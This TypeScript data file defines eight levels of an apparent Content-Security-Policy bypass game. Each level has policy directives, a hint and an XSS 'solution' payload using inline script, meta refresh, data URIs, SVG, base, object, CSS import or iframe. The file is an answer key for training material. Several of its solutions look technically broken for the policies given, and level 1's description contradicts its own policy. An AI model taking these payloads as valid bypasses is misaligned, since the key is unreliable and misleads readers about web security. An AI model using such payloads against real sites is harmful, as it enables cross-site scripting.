import { Level } from "@/types/game";

export const levels: Level[] = [
  {
    id: 1,
    title: "Basic CSP",
    description: "Let's start with a simple CSP that only allows inline scripts. Can you bypass it?",
    csp: [
      {
        name: "default-src",
        value: "'self'",
        description: "Restricts all resources to be loaded only from the same origin"
      },
      {
        name: "script-src",
        value: "'self' 'unsafe-inline'",
        description: "Allows scripts from same origin and inline scripts"
      }
    ],
    hint: "Think about how 'unsafe-inline' affects script execution...",
    solution: "<script>alert(1)</script>"
  },
  {
    id: 2,
    title: "Meta Refresh",
    description: "Scripts are blocked, but what about other ways to execute JavaScript?",
    csp: [
      {
        name: "default-src",
        value: "'self'",
        description: "Restricts all resources to be loaded only from the same origin"
      },
      {
        name: "script-src",
        value: "'none'",
        description: "Blocks all scripts"
      }
    ],
    hint: "Meta refresh tags can be used for navigation...",
    solution: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
  },
  {
    id: 3,
    title: "Data URI Fun",
    description: "Scripts are blocked from most sources, but what about data URIs?",
    csp: [
      {
        name: "default-src",
        value: "'self'",
        description: "Restricts all resources to be loaded only from the same origin"
      },
      {
        name: "script-src",
        value: "'self' data:",
        description: "Allows scripts from same origin and data URIs"
      }
    ],
    hint: "Data URIs can contain JavaScript...",
    solution: "<script src=\"data:text/javascript,alert(1)\"></script>"
  },
  {
    id: 4,
    title: "SVG Scripting",
    description: "Images are allowed from any source, including SVGs. What could go wrong?",
    csp: [
      {
        name: "default-src",
        value: "'none'",
        description: "Blocks all resources by default"
      },
      {
        name: "img-src",
        value: "* data:",
        description: "Allows images from any source including data URIs"
      }
    ],
    hint: "SVGs can contain executable code...",
    solution: "<img src=\"data:image/svg+xml,<svg onload='alert(1)'/>\">"
  },
  {
    id: 5,
    title: "Base URI Injection",
    description: "The base-uri directive is set to allow any URL. How can this be exploited?",
    csp: [
      {
        name: "default-src",
        value: "'self'",
        description: "Restricts all resources to be loaded only from the same origin"
      },
      {
        name: "script-src",
        value: "'self'",
        description: "Only allows same-origin scripts"
      },
      {
        name: "base-uri",
        value: "*",
        description: "Allows any base URI to be set"
      }
    ],
    hint: "The base tag affects how relative URLs are resolved...",
    solution: "<base href=\"javascript://%0aalert(1)//\">"
  },
  {
    id: 6,
    title: "Object Source",
    description: "Objects are allowed from any source. Can you use this for XSS?",
    csp: [
      {
        name: "default-src",
        value: "'none'",
        description: "Blocks all resources by default"
      },
      {
        name: "object-src",
        value: "*",
        description: "Allows objects from any source"
      }
    ],
    hint: "Object tags can load JavaScript...",
    solution: "<object data=\"data:text/html,<script>alert(1)</script>\">"
  },
  {
    id: 7,
    title: "Stylesheet Scripts",
    description: "Stylesheets are allowed from any source with unsafe-inline. What could go wrong?",
    csp: [
      {
        name: "default-src",
        value: "'none'",
        description: "Blocks all resources by default"
      },
      {
        name: "style-src",
        value: "* 'unsafe-inline'",
        description: "Allows styles from any source and inline styles"
      }
    ],
    hint: "CSS can sometimes execute JavaScript...",
    solution: "<style>@import 'javascript:alert(1)';</style>"
  },
  {
    id: 8,
    title: "Frame Navigation",
    description: "Frames can navigate to any URL. How can this be exploited?",
    csp: [
      {
        name: "default-src",
        value: "'self'",
        description: "Restricts all resources to be loaded only from the same origin"
      },
      {
        name: "frame-src",
        value: "*",
        description: "Allows frames to load content from any source"
      }
    ],
    hint: "Frames can navigate to javascript: URLs...",
    solution: "<iframe src=\"javascript:alert(1)\">"
  }
];